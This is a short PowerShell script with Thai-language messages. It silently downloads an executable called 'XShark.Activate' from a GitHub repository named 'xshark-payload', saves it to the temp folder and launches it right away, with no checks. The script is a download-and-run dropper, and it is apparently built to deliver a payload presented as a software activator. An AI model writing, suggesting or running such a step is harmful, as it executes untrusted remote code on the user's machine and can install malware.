# ปิดการแสดงผลแถบโหลดสีฟ้า (ช่วยให้ดาวน์โหลดเร็วขึ้นมาก)
$ProgressPreference = 'SilentlyContinue'

$url = "https://github.com/puppup3336-lab/xshark-payload/releases/download/V1.0/XShark.Activate-1.0.exe"
$dest = "$env:TEMP\XSharkActivate.exe"

Write-Host "กำลังดาวน์โหลดโปรแกรม กรุณารอสักครู่..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $dest

Write-Host "กำลังเปิดโปรแกรม..." -ForegroundColor Green
Start-Process $dest
